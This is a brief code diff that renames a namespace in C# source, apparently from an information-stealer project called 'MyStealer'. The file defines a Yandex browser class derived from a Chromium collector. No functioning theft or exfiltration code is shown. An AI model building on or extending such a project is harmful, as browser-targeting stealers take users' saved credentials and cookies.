@@ -1,7 +1,7 @@
 ﻿using System.IO;
 using System;
 
-namespace MyStealer.Modules.Browser.ChromiumBased
+namespace MyStealer.Collectors.Browser.ChromiumBased
 {
     internal class YandexBrowser : Chromium
     {
